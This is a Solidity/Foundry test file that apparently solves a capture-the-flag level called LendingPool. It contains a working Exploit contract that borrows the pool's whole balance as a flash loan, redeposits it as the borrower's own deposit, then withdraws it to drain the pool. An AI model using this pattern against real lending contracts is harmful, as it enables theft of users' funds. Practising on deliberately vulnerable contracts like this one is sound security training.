// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        Exploit exploier = new Exploit();
        exploier.flashLoan(instance);
        exploier.withdraw(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Exploit is IFlashLoanReceiver {

    function flashLoan(LendingPool instance) public {
        instance.flashLoan(address(instance).balance);
    }

    function withdraw(LendingPool instance) public {
        instance.withdraw();
    }
    
    function execute() public payable {
        LendingPool(msg.sender).deposit{value:msg.value}();
    }

receive() external payable {}
}
